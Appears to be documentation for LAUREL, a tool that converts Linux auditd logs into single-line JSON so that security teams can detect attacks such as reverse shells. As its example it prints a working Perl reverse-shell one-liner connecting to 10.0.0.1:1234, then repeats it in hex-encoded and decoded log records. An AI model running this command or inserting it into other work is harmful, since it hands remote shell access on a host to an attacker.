# Practical _auditd(8)_ problems

When configured with the right ruleset, logs written by the Linux audit daemon contain most of the information that a competent SOC team needs for host-based security monitoring.

Unfortunately, some design choices for the log format make accessing this information harder than necessary.

Running a simple Perl [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) one-liner
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
produces the following output in the audit log:
```
type=SYSCALL msg=audit(1626611363.720:348501): arch=c000003e syscall=59 success=yes exit=0 a0=55c094deb5c0 a1=55c094dea770 a2=55c094dbf1b0 a3=fffffffffffff286 items=3 ppid=722076 pid=724395 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=3 comm="perl" exe="/usr/bin/perl" subj==unconfined key=(null)ARCH=x86_64 SYSCALL=execve AUID="user" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F61746F6E282469292929297B6F70656E28535444494E2C223E265322293B6F70656E285354444F55542C223E265322293B6F70656E285354444552522C223E265322293B6578656328222F62696E2F7368202D6922293B7D3B
type=CWD msg=audit(1626611363.720:348501): cwd="/root"
type=PATH msg=audit(1626611363.720:348501): item=0 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1626611363.720:348501): item=1 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1626611363.720:348501): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=404797 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1626611363.720:348501): proctitle=7065726C002D650075736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F6174
```

A cursory look at the audita log does not tell us what is going on, except that a Perl interpreter has been started. We would like to do better.

There are several issues with processing this log file format within a SIEM context:

- Different aspects of the same audit event are spread across multiple lines and have to be joined together.
- Strings that contain characters with special meaning for the audit log format (spaces, quotes, etc.) are encoded as hexadecimal strings without quotes and require decoding before they can be processed or displayed to the analyst.
- For numeric values, there is no clear distinction whether they should be interpreted as decimal, octal, or hexadecimal values. (This does not matter for this example.)
- Long command lines are even spread across multiple EXECVE event lines. (This does not matter for this example.)
- If the _auditd(8)_ user-space daemon adds information such as user   or group names (`format=ENRICHED`), this extra information is appended after a `\x1d` "group separator" character which may or may  not be displayed correctly.

This is the same log entry, processed by _LAUREL_ into a single JSON log line:
``` json
{"ID":"1626611363.720:348501","SYSCALL":{"arch":"0xc000003e","syscall":59,"success":"yes","exit":0,"a0":"0x55c094deb5c0","a1":"0x55c094dea770","a2":"0x55c094dbf1b0","a3":"0xfffffffffffff286","items":3,"ppid":722076,"pid":724395,"auid":1000,"uid":0,"gid":0,"euid":0,"suid":0,"fsuid":0,"egid":0,"sgid":0,"fsgid":0,"tty":"pts3","ses":3,"comm":"perl","exe":"/usr/bin/perl","subj":"=unconfined","key":null,"ARCH":"x86_64","SYSCALL":"execve","AUID":"user","UID":"root","GID":"root","EUID":"root","SUID":"root","FSUID":"root","EGID":"root","SGID":"root","FSGID":"root","PPID":{"EVENT_ID":"1626611323.973:348120","exe":"/bin/bash","comm":"bash","ppid":3190631}},"EXECVE":{"argc":3,"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]},"CWD":{"cwd":"/root"},"PATH":[{"item":0,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":1,"name":"/usr/bin/perl","inode":401923,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"},{"item":2,"name":"/lib64/ld-linux-x86-64.so.2","inode":404797,"dev":"fd:01","mode":"0o100755","ouid":0,"ogid":0,"rdev":"00:00","nametype":"NORMAL","cap_fp":"0x0","cap_fi":"0x0","cap_fe":0,"cap_fver":"0x0","cap_frootid":"0","OUID":"root","OGID":"root"}],"PROCTITLE":{"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_at"]}}
```

We can see that our main problems that would have prevented us from identifying the reverse shell have been resolved:
``` json
"EXECVE":{"argc":3,"ARGV":["perl","-e","use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}
```

We can also see the parent process that was used to spawn the reverse shell:
``` json
"PPID":{"EVENT_ID":"1626611323.973:348120","exe":"/bin/bash","comm":"bash","ppid":3190631}
```

Every line is a proper JSON document that can be reformatted with _jq_:
``` json
{
  "ID": "1626611363.720:348501",
  "SYSCALL": {
    "arch": "0xc000003e",
    "syscall": 59,
    "success": "yes",
    "exit": 0,
    "a0": "0x55c094deb5c0",
    "a1": "0x55c094dea770",
    "a2": "0x55c094dbf1b0",
    "a3": "0xfffffffffffff286",
    "items": 3,
    "ppid": 722076,
    "pid": 724395,
    "auid": 1000,
    "uid": 0,
    "gid": 0,
    "euid": 0,
    "suid": 0,
    "fsuid": 0,
    "egid": 0,
    "sgid": 0,
    "fsgid": 0,
    "tty": "pts3",
    "ses": 3,
    "comm": "perl",
    "exe": "/usr/bin/perl",
    "subj": "=unconfined",
    "key": null,
    "ARCH": "x86_64",
    "SYSCALL": "execve",
    "AUID": "user",
    "UID": "root",
    "GID": "root",
    "EUID": "root",
    "SUID": "root",
    "FSUID": "root",
    "EGID": "root",
    "SGID": "root",
    "FSGID": "root",
    "PPID": {
      "EVENT_ID": "1626611323.973:348120",
      "exe": "/bin/bash",
      "comm": "bash",
      "ppid": 3190631
    }
  },
  "EXECVE": {
    "argc": 3,
    "ARGV": [
      "perl",
      "-e",
      "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"
    ]
  },
  "CWD": {
    "cwd": "/root"
  },
  "PATH": [
    {
      "item": 0,
      "name": "/usr/bin/perl",
      "inode": 401923,
      "dev": "fd:01",
      "mode": "0o100755",
      "ouid": 0,
      "ogid": 0,
      "rdev": "00:00",
      "nametype": "NORMAL",
      "cap_fp": "0x0",
      "cap_fi": "0x0",
      "cap_fe": 0,
      "cap_fver": "0x0",
      "cap_frootid": "0",
      "OUID": "root",
      "OGID": "root"
    },
    {
      "item": 1,
      "name": "/usr/bin/perl",
      "inode": 401923,
      "dev": "fd:01",
      "mode": "0o100755",
      "ouid": 0,
      "ogid": 0,
      "rdev": "00:00",
      "nametype": "NORMAL",
      "cap_fp": "0x0",
      "cap_fi": "0x0",
      "cap_fe": 0,
      "cap_fver": "0x0",
      "cap_frootid": "0",
      "OUID": "root",
      "OGID": "root"
    },
    {
      "item": 2,
      "name": "/lib64/ld-linux-x86-64.so.2",
      "inode": 404797,
      "dev": "fd:01",
      "mode": "0o100755",
      "ouid": 0,
      "ogid": 0,
      "rdev": "00:00",
      "nametype": "NORMAL",
      "cap_fp": "0x0",
      "cap_fi": "0x0",
      "cap_fe": 0,
      "cap_fver": "0x0",
      "cap_frootid": "0",
      "OUID": "root",
      "OGID": "root"
    }
  ],
  "PROCTITLE": {
    "ARGV": [
      "perl",
      "-e",
      "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_at"
    ]
  }
}
```
